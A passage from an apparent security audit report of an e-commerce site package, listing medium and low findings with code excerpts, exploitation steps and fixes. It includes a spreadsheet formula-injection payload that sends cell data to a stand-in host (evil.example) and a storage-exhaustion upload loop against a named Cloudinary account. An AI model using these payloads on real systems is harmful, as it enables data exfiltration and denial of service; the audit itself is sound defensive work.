    50→    50→the '1' flag with validation of the signed session token before rendering the panel.
    51→    51→5. Medium-Severity Findings
    52→    52→These findings degrade integrity, mislead the operator, or enlarge the attack surface without granting
    53→    53→immediate destruction. Several of them are load-bearing for the replication package's stated purpose: a buyer
    54→    54→of this kit will follow documentation that is wrong, run tests that do not test the shipped code, and inherit
    55→    55→dependencies the site never uses.
    56→    56→M-01 Google Sheets formula injection through customer-controlled order fields
    57→    57→Severity Medium Confidence Confirmed
    58→    58→Location apps-script.gs:684-692 (appendRow with raw p.fullName / p.notes / p.wilaya / p.commune)
    59→    59→sheet.appendRow([ new Date(), 'New', productStr, ...,
    60→    60→p.fullName || '', p.phone || '', p.wilaya || '', p.commune || '',
    61→    61→..., notesStr, variantStr, stockKeyStr, '' ]);
    62→    62→// no sanitization: a fullName of '=IMPORTXML(...)' becomes a live formula
    63→    63→Why it is a flaw. Values typed by the customer are written verbatim into spreadsheet cells. Google Sheets
    64→    64→interprets any cell value that begins with '=', '+', '-' or '@' as a formula when written through appendRow. A
    65→    65→malicious customer can therefore submit a name or note such as =IMPORTXML("http://attacker/","//a") or
    66→    66→=HYPERLINK(...) and have it execute inside the store owner's spreadsheet the moment the sheet recalculates
    67→    67→or the owner clicks it.
    68→    68→Impact. Data exfiltration from the spreadsheet, misleading links presented to the owner inside their own
    69→    69→operational tool, and potential propagation if the sheet is later exported.
    70→    70→Trigger / exploitation. Place an order with fullName =
    71→    71→'=IMPORTXML("http://evil.example/?x="&A2;,"//")'. When the owner opens the Orders tab, the formula
    72→    72→fetches attacker URLs with cell content appended.
    73→    73→Required fix. Sanitize all user-supplied values before appendRow: prefix dangerous leading characters with
    74→    74→an apostrophe, or store an underscore-prefixed copy and strip it in any downstream processing.
    75→    75→Z.ai - Principal Audit Series 10
    76→    76→
    77→    77→=== PAGE 13 ===
    78→    78→SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
    79→    79→M-02 Documentation and configuration contradict the shipped code
    80→    80→Severity Medium Confidence Confirmed
    81→    81→Location README.md (Next.js 16, '6-layer defense', 'never in client bundle'); package.json:3,60 (next 15.5.2, scaffold name);
    82→    82→wrangler.toml comment ('3-minute TTL') vs worker/data-sync.js:83 (KV_TTL_SECONDS = 3600)
    83→    83→README.md: 'Next.js 16 + TypeScript + Tailwind 4'
    84→    84→package.json: "next": "^15.5.2", "name": "nextjs_tailwind_shadcn_ts"
    85→    85→wrangler.toml: 'KV namespace - Product + Stock cache (3-minute TTL)'
    86→    86→worker/data-sync.js: const KV_TTL_SECONDS = 3600; // actually 1 hour
    87→    87→Why it is a flaw. Multiple factual claims in the documentation are false against the code that ships next to
    88→    88→them: the framework version, the security guarantees (see C-02), the cache TTL, and the project identity (the
    89→    89→package.json name is still the generic scaffold name). For a package whose explicit purpose is to let a
    90→    90→non-expert replicate and operate the site, wrong operational documentation is not cosmetic - it drives wrong
    91→    91→setup decisions and wrong incident response.
    92→    92→Impact. Operators tune freshness and debugging expectations against wrong numbers; security assumptions
    93→    93→are misplaced (the strongest claims are the false ones); brand confusion in tooling.
    94→    94→Trigger / exploitation. Direct comparison of README/wrangler comments with package.json and worker
    95→    95→code.
    96→    96→Required fix. Correct the README and wrangler comments, rename the package, and add a CI check that
    97→    97→greps docs for version claims against package.json.
    98→    98→M-03 /api/shipping calls an Apps Script action that does not exist
    99→    99→Severity Medium Confidence Confirmed
   100→   100→Location src/app/api/shipping/route.ts:9-20 (calls ?action=shipping); apps-script.gs:102-128 (doGet has no 'shipping' branch)
   101→   101→shipping/route.ts: const url = `${base}?action=shipping`;
   102→   102→apps-script.gs doGet: handles stock | products | order | health |
   103→   103→statistics | process_confirmed | product_delete | product_reset |
   104→   104→dedupe | cleanup -> 'shipping' falls to 'unknown action'
   105→   105→Response: {ok:false, error:'unknown action: shipping'} -> parsed as []
   106→   106→Why it is a flaw. The shipping route requests an action the backend never implements, so the endpoint can
   107→   107→only ever return an empty shipping list with source 'sheet'. The real shipping prices live in a hardcoded table in
   108→   108→src/lib/shipping.ts, which the frontend uses directly. This is dead integration code that looks alive: it returns
   109→   109→HTTP 200, reports source 'sheet', and silently masks the fact that the sheet was never consulted.
   110→   110→Impact. No functional impact today (the hardcoded table carries the site), but the endpoint misleads operators
   111→   111→into believing shipping prices are sheet-driven; any future edit to the sheet will never reach customers.
   112→   112→Trigger / exploitation. curl https:///api/shipping - always returns an empty array despite a populated Sheet.
   113→   113→Z.ai - Principal Audit Series 11
   114→   114→
   115→   115→=== PAGE 14 ===
   116→   116→SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
   117→   117→Required fix. Either implement a shipping tab in the Apps Script or delete the route and document that
   118→   118→shipping prices are code-owned constants.
   119→   119→M-04 TypeScript build errors are silently ignored
   120→   120→Severity Medium Confidence Confirmed
   121→   121→Location next.config.ts:5-8 (typescript.ignoreBuildErrors = true); tsconfig.json (noImplicitAny = false)
   122→   122→next.config.ts: typescript: { ignoreBuildErrors: true },
   123→   123→tsconfig.json: "noImplicitAny": false,
   124→   124→// the project's own docs/CODE-AUDIT-REPORT.md flagged this as P1
   125→   125→// in a previous internal audit - still present in this package
   126→   126→Why it is a flaw. The build is configured to ignore TypeScript errors entirely, and implicit-any is permitted.
   127→   127→Combined with the large amount of untyped 'any' handling in data-normalization paths
   128→   128→(normalizeSheetProduct and friends), type regressions in the money-critical order flow can ship to production
   129→   129→invisibly. The project's own internal audit already flagged this and the flag was never removed.
   130→   130→Impact. Latent runtime defects in production (the exact class of bug the type system exists to catch), and a
   131→   131→false sense of safety from 'TypeScript: 0 errors' claims in the WORKLOG.
   132→   132→Trigger / exploitation. Introduce a type error in any source file and run the production build - it succeeds.
   133→   133→Required fix. Remove ignoreBuildErrors, set noImplicitAny true, and fix the resulting errors incrementally
   134→   134→(start with lib/ and api/ where money flows).
   135→   135→M-05 Test suite validates a mirror copy of the logic, and one verifier is
   136→   136→machine-bound
   137→   137→Severity Medium Confidence Confirmed
   138→   138→Location scripts/test-comprehensive.js:54-100 (re-implemented parseVariantContent_ etc.); scripts/verify-apps-script.js:8-11
   139→   139→(hardcoded absolute paths)
   140→   140→// MIRROR OF apps-script.gs HELPERS (extraction + decrement)
   141→   141→function parseVariantContent(content) { ... } // copied by hand
   142→   142→verify-apps-script.js:
   143→   143→const files = ['/home/z/my-project/download/apps-script.gs',
   144→   144→'/home/z/my-project/upload/apps-script.gs'];
   145→   145→Why it is a flaw. The 212 'comprehensive' checks run against a hand-copied duplicate of the Apps Script
   146→   146→helper functions, not against the shipped apps-script.gs. If the real file drifts from the mirror, the suite keeps
   147→   147→passing while production behavior changes. Additionally, verify-apps-script.js reads hardcoded absolute paths
   148→   148→from the original developer's machine, so the 'syntax check' step fails for every other user of the package
   149→   149→(confirmed during this audit: the script crashed with ENOENT).
   150→   150→Z.ai - Principal Audit Series 12
   151→   151→
   152→   152→=== PAGE 15 ===
   153→   153→SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
   154→   154→Impact. False confidence: green tests do not describe shipped behavior; a broken replication workflow for the
   155→   155→new owner (the README instructs running this verifier as step one).
   156→   156→Trigger / exploitation. Change a stock-key separator in apps-script.gs but not in the test mirror - all 212
   157→   157→checks still pass. Run node scripts/verify-apps-script.js on any machine other than the original author's - it
   158→   158→throws.
   159→   159→Required fix. Load the .gs file at runtime in the tests (parse once, extract the functions) and resolve paths
   160→   160→relative to the script directory (__dirname/..).
   161→   161→M-06 Thirteen-plus unused heavyweight dependencies inflate attack surface and
   162→   162→build time
   163→   163→Severity Medium Confidence Confirmed
   164→   164→Location package.json:16-98; verified by import scan of src/
   165→   165→next-auth, @tanstack/react-query, @tanstack/react-table, recharts,
   166→   166→@mdxeditor/editor, @dnd-kit/* (3 pkgs), react-syntax-highlighter,
   167→   167→next-intl, uuid, date-fns, input-otp, vaul, embla-carousel-react,
   168→   168→z-ai-web-dev-sdk -> zero imports anywhere in src/
   169→   169→prisma + @prisma/client: only referenced by the unused src/lib/db.ts
   170→   170→Why it is a flaw. Roughly a third of the 64 declared dependencies are never imported by any shipped code
   171→   171→(left over from the scaffold). Each unused package still gets installed, audited, and bundled-scanned, enlarging
   172→   172→the dependency graph that a supply-chain attack can hide in, slowing every build, and confusing the next
   173→   173→maintainer about what the site actually needs. The README presents '64 packages' as a feature rather than a
   174→   174→liability.
   175→   175→Impact. Larger install/build surface, slower CI, more CVE noise, and a misleading dependency inventory for
   176→   176→the replication package.
   177→   177→Trigger / exploitation. rg -l '' src/ returns nothing for each listed dependency.
   178→   178→Required fix. Remove the unused dependencies (and src/lib/db.ts with prisma) from package.json; keep only
   179→   179→what the bundle actually imports.
   180→   180→M-07 Public unsigned Cloudinary preset allows anyone to fill the image storage
   181→   181→quota
   182→   182→Severity Medium Confidence Confirmed
   183→   183→Location src/lib/client-sheet.ts:468-560 (clientUploadImage, unsigned upload); .env.example
   184→   184→(NEXT_PUBLIC_CLOUDINARY_*); README Step 3
   185→   185→formData.append('upload_preset', UPLOAD_PRESET); // 'soumdeco'
   186→   186→// unsigned upload - by design, so the browser can upload directly
   187→   187→// cloud name 'anhvhy4j' is public in the client bundle
   188→   188→Z.ai - Principal Audit Series 13
   189→   189→
   190→   190→=== PAGE 16 ===
   191→   191→SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
   192→   192→Why it is a flaw. The image pipeline relies on an unsigned upload preset, meaning the Cloudinary account
   193→   193→accepts uploads from anyone who knows the public cloud name and preset - both of which ship in the client
   194→   194→bundle and the README. There is no server-side gate, no file-type check beyond Cloudinary's defaults, and
   195→   195→no rate limit. The 25 GB free-tier storage that the product images depend on can be consumed by a script in an
   196→   196→afternoon.
   197→   197→Impact. Storage-exhaustion attack: once the quota is hit, the admin can no longer upload product images and
   198→   198→the daily image sync pipeline breaks, degrading the storefront over time.
   199→   199→Trigger / exploitation. Loop POST https://api.cloudinary.com/v1_1/anhvhy4j/image/upload with the public
   200→   200→preset and arbitrary files until the account is full.
   201→   201→Required fix. Switch to signed uploads from an edge route (the signing secret stays server-side), enforce file
   202→   202→type and size limits, and set a Cloudinary upload-rate alert.
   203→   203→M-08 Worker CORS allowlist omits custom domains, and /refresh throttling is
   204→   204→keyed to cron activity
   205→   205→Severity Medium Confidence Likely
   206→   206→Location worker/data-sync.js:41-47 (ALLOWED_ORIGINS), 130-145 (rate limit reads __meta.lastSyncAttempt)
   207→   207→const ALLOWED_ORIGINS = new Set([
   208→   208→'https://soumdeco.pages.dev', 'https://www.soumdeco.pages.dev',
   209→   209→'http://localhost:3000', 'http://127.0.0.1:3000', ]);
   210→   210→// refresh cooldown reads meta.lastSyncAttempt - also written by cron
   211→   211→Why it is a flaw. The Worker only allows the pages.dev hostnames and localhost. If the store is ever moved to
   212→   212→a custom domain (a natural next step for a real shop), direct browser calls to the Worker - health checks in the
   213→   213→admin panel - will fail CORS. Separately, the /refresh cooldown compares against lastSyncAttempt, which the
   214→   214→5-minute cron also updates, so an admin refresh issued shortly after a cron run is spuriously rejected as
   215→   215→rate-limited; the client masks this as success.
   216→   216→Impact. Broken worker health/status panel on any future custom domain; occasional silently-ignored manual
   217→   217→refreshes that confuse admin workflows.
   218→   218→Trigger / exploitation. Call /api/refresh within 3 seconds of a cron sync - returns rate_limited although the
   219→   219→caller did nothing wrong.
   220→   220→Required fix. Add the production custom domain to the allowlist (or read it from env), and track the last
   221→   221→manual refresh in a separate KV key from cron updates.
   222→   222→Z.ai - Principal Audit Series 14
   223→   223→
   224→   224→=== PAGE 17 ===
   225→   225→SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
   226→   226→6. Low-Severity Findings
   227→   227→These are correctness and hygiene defects with narrow blast radius. They are recorded because each has been
   228→   228→verified to occur under realistic conditions, and because two of them (legacy stock keys and the
   229→   229→quantity-suffix regex) will quietly corrupt inventory records over time.
   230→   230→L-01 Quantity-stripping regex can truncate legitimate product names ending in 'x'
   231→   231→+ digits
   232→   232→Severity Low Confidence Confirmed
   233→   233→Location apps-script.gs:313, 557, 1118 (regex: strip trailing 'x' or multiplication sign + digits)
   234→   234→var bareName = productName.replace(/\s*[x\u00d7]\s*\d+\s*$/, '').trim();
   235→   235→// a product genuinely named 'Pack x2' is reduced to 'Pack'
   236→   236→// -> stock key no longer matches the Stock tab row 'Pack x2'
   237→   237→Why it is a flaw. Order rows store quantities as a suffix (for example 'Product x3'), and the backend strips
   238→   238→that suffix with a broad regex before matching stock keys. Any product whose real name ends with 'x'
   239→   239→followed by digits (sizes like 'x2', model numbers like 'Table x4') gets truncated, so its stock row never
   240→   240→matches and its inventory is never decremented.
   241→   241→Impact. Silent stock drift for affected products; the out-of-stock display and the sheet disagree over time.
   242→   242→Trigger / exploitation. Create a product named 'Pack x2', sell it, confirm the order - the 'Pack x2' Stock row
   243→   243→is untouched.
   244→   244→Required fix. Send quantity as a separate sheet field (it already exists) and stop encoding it into the product
   245→   245→name; keep the stripping only as a legacy fallback for old rows.
   246→   246→L-02 process_confirmed and statistics are public unauthenticated actions
   247→   247→Severity Low Confidence Confirmed
   248→   248→Location apps-script.gs:111-112 (public section of doGet)
   249→   249→if (action === 'statistics') return setupStatistics();
   250→   250→if (action === 'process_confirmed') return doProcessConfirmedFromUrl();
   251→   251→// both mutate/rebuild the spreadsheet - no isAuthorized_ check
   252→   252→Why it is a flaw. Two write-capable actions sit in the public section of the dispatcher, contradicting the file's
   253→   253→own 'writes require token' rule. process_confirmed scans and batch-writes the Orders and Stock tabs; statistics
   254→   254→clears and rebuilds the Statistics tab. They are abusable as load generators against the Apps Script quota and
   255→   255→can interfere with the owner's spreadsheet state.
   256→   256→Impact. Remote-triggered heavy sheet operations; quota burn; nuisance rebuilds of the Statistics tab.
   257→   257→Z.ai - Principal Audit Series 15
   258→   258→
   259→   259→=== PAGE 18 ===
   260→   260→SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
   261→   261→Trigger / exploitation. curl '?action=statistics' repeatedly - the Statistics sheet is cleared and rebuilt each
   262→   262→time.
   263→   263→Required fix. Move both actions behind isAuthorized_ and keep them menu-only.
   264→   264→L-03 Arabic-primary store renders inside an LTR document root
   265→   265→Severity Low Confidence Confirmed
   266→   266→Location src/app/layout.tsx:89 (html lang='ar' dir='ltr')
   267→   267→// UI copy, forms and checkout are Arabic; RTL is simulated per-component
   268→   268→Why it is a flaw. The document root declares left-to-right direction while the store's primary language and
   269→   269→checkout flow are Arabic. Component-level classes compensate visually, but mixed-direction text (Arabic
   270→   270→product names containing Latin codes, phone numbers, totals) is rendered with the wrong base direction,
   271→   271→which commonly produces misplaced punctuation, mirrored brackets, and confusing number ordering at
   272→   272→exactly the money-critical moments.
   273→   273→Impact. Subtle reading errors in order details for Arabic-first customers; accessibility tools announce the page
   274→   274→direction incorrectly.
   275→   275→Trigger / exploitation. Inspect any order summary containing Latin digits and Arabic labels side by side.
   276→   276→Required fix. Set dir='rtl' on the root and scope dir='ltr' to the few Latin-only components, or use the CSS
   277→   277→logical-property utilities Tailwind provides.
   278→   278→L-04 Order timestamps depend on the script's unpinned timezone
   279→   279→Severity Low Confidence Likely
   280→   280→Location apps-script.gs:684 (new Date() in appendRow); no appsscript.json manifest in the package
   281→   281→sheet.appendRow([ new Date(), 'New', ... ]);
   282→   282→// Apps Script project timezone is not pinned anywhere in the zip
   283→   283→Why it is a flaw. Order dates are written using the Apps Script project's timezone, and the package contains
   284→   284→no appsscript.json manifest to pin it. A replication by a new owner (a different Google account, possibly a
   285→   285→different locale) can silently shift all order times by hours, which matters for a shop whose analytics compare
   286→   286→daily order volume.
   287→   287→Impact. Mis-dated orders near midnight; confusing daily statistics after replication.
   288→   288→Trigger / exploitation. Deploy the script in an account whose default timezone differs from the original, then
   289→   289→compare order dates with the customer's local time.
   290→   290→Required fix. Ship an appsscript.json with an explicit timeZone, or write dates as formatted strings in UTC+1
   291→   291→(Algeria) from a fixed offset.
   292→   292→Z.ai - Principal Audit Series 16
   293→   293→
   294→   294→=== PAGE 19 ===
   295→   295→SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
   296→   296→L-05 Reversed QUERY ranges and fragile constructs in the statistics builder
   297→   297→Severity Low Confidence Confirmed
   298→   298→Location apps-script.gs:1036, 1044 (QUERY(Orders!J2:G, ...)), 726 (row-1 Arabic skip hack)
   299→   299→val(24,1,'=IFERROR(QUERY(Orders!J2:G, "SELECT J, COUNT(J), SUM(G) ...'
   300→   300→// J2:G is a reversed range - Sheets normalizes it, but it is fragile
   301→   301→serveStock: if (i === 1 && /Arabic regex/.test(String(r[0]))) continue;
   302→   302→Why it is a flaw. The statistics formulas use reversed A1 ranges (J2:G instead of G2:J) that happen to be
   303→   303→normalized by Sheets, plus a hardcoded skip of row 2 when it contains Arabic characters to suppress a legacy
   304→   304→guidance row. Both constructs work today but depend on undocumented normalization and on the guidance
   305→   305→row staying exactly where it is.
   306→   306→Impact. Statistics sections silently show 'Aucune commande' if a future Sheets update stops normalizing;
   307→   307→stock parsing breaks if the guidance row moves.
   308→   308→Trigger / exploitation. None required - code inspection; verified against Sheets normalization behavior.
   309→   309→Required fix. Rewrite ranges in canonical order (G2:J) and replace the row-skip hack with an explicit
   310→   310→header/flag check.
   311→   311→L-06 Legacy comma-format stock keys are treated as single keys forever
   312→   312→Severity Low Confidence Confirmed
   313→   313→Location apps-script.gs:429-449 (splitStockKey_ refuses to split on commas)
   314→   314→// NEVER splits on ',' - product names can contain commas
   315→   315→if (s.indexOf(';') >= 0) return s.split(';');
   316→   316→return [s]; // single key (even if it contains commas)
   317→   317→Why it is a flaw. Historical orders recorded multi-variant stock keys with comma separators before the
   318→   318→semicolon migration. The current parser deliberately never splits them, so those legacy keys can never match
   319→   319→per-variant stock rows. The design assumes the admin will reprocess old orders via the menu action, but
   320→   320→nothing in the UI prompts this after replication.
   321→   321→Impact. A small set of legacy orders silently never decrement stock after the package is reused.
   322→   322→Trigger / exploitation. Inspect any pre-migration order row with a comma stock key and confirm its status
   323→   323→flip does not decrement anything.
   324→   324→Required fix. Add a one-time migration that rewrites comma keys for rows whose product name contains no
   325→   325→commas, or surface a replication checklist step that runs the reprocessor.
   326→   326→Z.ai - Principal Audit Series 17
   327→   327→
   328→   328→=== PAGE 20 ===
   329→   329→SOUM DECO WEBSITE PACKAGE - FULL-STACK SECURITY AND QUALITY AUDIT
   330→   330→L-07 Worker change detection relies on a 32-bit hash with realistic collision odds
   331→   331→Severity Low Confidence Confirmed
   332→   332→Location worker/data-sync.js:72-80 (hashString, djb2)
   333→   333→function hashString(s) { let h = 5381;
   334→   334→for (let i = 0; i < s.length; i++)
   335→   335→h = ((h << 5) + h + s.charCodeAt(i)) | 0;
   336→   336→return String(h >>> 0); } // 32-bit djb2
   337→   337→Why it is a flaw. Catalog change detection compares 32-bit djb2 hashes of the products and stock payloads.
   338→   338→For inputs of this size, accidental collisions are unlikely but not negligible, and a collision would make the
   339→   339→Worker skip a legitimate update until the next TTL-driven rewrite (up to one hour of staleness). A
   340→   340→cryptographic digest would remove the ambiguity at negligible cost.
   341→   341→Impact. Rare one-hour windows where a changed catalog is not refreshed on change-detection grounds.
   342→   342→Trigger / exploitation. Constructing a deliberate collision is impractical for an outsider; the risk is accidental
   343→   343→staleness only.
   344→   344→Required fix. Replace djb2 with a SHA-256 digest via crypto.subtle (available in the Worker runtime).
   345→   345→7. Consolidated Fix Roadmap
   346→   346→The roadmap below orders the remediation work by urgency. P0 items are the minimum needed to make the
   347→   347→live deployment defensible and are sized for a single focused day: rotate every shipped credential, close the
   348→   348→two unauthenticated write paths, and make the Apps Script fail closed. P1 items restore the integrity of the
   349→   349→order pipeline and the durability of the data plane over the following week. P2 hardening and P3 hygiene can
